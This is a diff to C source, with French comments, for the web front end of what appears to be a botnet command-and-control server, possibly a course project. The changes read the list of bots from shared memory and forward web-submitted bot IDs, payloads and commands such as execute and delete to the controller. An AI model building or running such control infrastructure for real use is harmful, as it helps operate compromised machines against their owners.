@@ -42,7 +42,7 @@
 #define NB_BOTS 3
 
 //pour des besoins de tests on prepare une liste
-char *ListeBot[3] = {"Bot1", "Bot2", "Bot3"};
+//char *ListeBot[3] = {"Bot1", "Bot2", "Bot3"};
 
 
 void send_data(const char *cmd, const char *filename, const char *id_bot)
@@ -60,11 +60,13 @@ void send_data(const char *cmd, const char *filename, const char *id_bot)
 }
 
 char* trans_commande(char * commande){
-      if (commande=="Statut") return "1";
-      if (commande=="Executer") return "3";
-      if (commande=="Resultat") return "4";
-      if (commande=="Effacer") return "5";
-      if (commande=="Quitter") return "6";
+      if (strcmp(commande, "Statut")==0) return "1";
+      else if (strcmp(commande, "Executer")==0) return "3";
+      else if (strcmp(commande, "Resultat")==0) return "4";
+      else if (strcmp(commande, "Effacer")==0) return "5";
+      else if (strcmp(commande, "Quitter")==0) return "6";
+      else return 0;
+
 }
 /**
 * Void page_acceuil(int nb_bots, char* ListeBot[])
@@ -155,7 +157,7 @@ void gestionClientWeb(void *s)
     char path[MAX_BUFFER];
     char type[MAX_BUFFER];
 
-    //on prepare les receptacle des sous-chaines à extraire
+    //on prepare les receptacles des sous-chaines à extraire
     char *Bot;
     char *Charge;
     char *Commande;
@@ -254,7 +256,9 @@ void gestionClientWeb(void *s)
         }
         //fin de l'extraction, on afficher les paramètres
         printf("Le Bot est %s, la charge est %s, et la commande est %s\n", Bot, Charge, Commande);
-        
+        //envoi de la commande via la shm
+        send_data(trans_commande(Commande), Charge, Bot);
+        printf("Commande envoyée au CC\n");
     }
 
     /*Sinon dans le cas de la commande d'installation d'une charge 2
@@ -334,7 +338,25 @@ void nouveauClientWeb(int dialogue)
 int main(void)
 {
 
-    page_acceuil(3, ListeBot);
+    //On récupère la liste des bots et le nombre de bots
+    info_bot_t *array_bots;
+    int *nbre_bot;
+    lectureShm(KEY_NBRE_BOT, (void *)&nbre_bot, sizeof(int));
+    printf("le nbre bots est : %d\n", *nbre_bot);
+    lectureShm(KEY, (void *)&array_bots, NBRE_MAX_BOT * sizeof(info_bot_t));
+
+    char* ListeBot[*nbre_bot];
+
+
+    for (int i = 0; i < *nbre_bot; i++)
+    {
+        ListeBot[i]=array_bots[i].ID;
+        printf("-----------------BOT_INACTIF-------------------------\n");
+        printf("\nID : %s \nlife_time: %s \netat: %c\n\n", array_bots[i].ID, array_bots[i].life_time, array_bots[i].etat);
+        printf("------------------------------------------\n");
+    }
+
+    page_acceuil(*nbre_bot, ListeBot);
 
     // Serveur TCP + boucle serveur
     char *PORT_WEB = "8000";
